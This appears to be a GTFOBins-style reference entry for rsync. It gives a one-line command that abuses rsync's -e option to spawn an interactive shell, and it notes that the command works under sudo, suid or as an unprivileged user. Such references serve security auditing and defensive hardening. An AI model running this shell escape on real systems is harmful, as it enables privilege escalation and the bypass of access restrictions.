---
type: gtfobin
name: rsync
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# rsync

## shell

```bash
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```
**Contexts:** sudo, suid, unprivileged
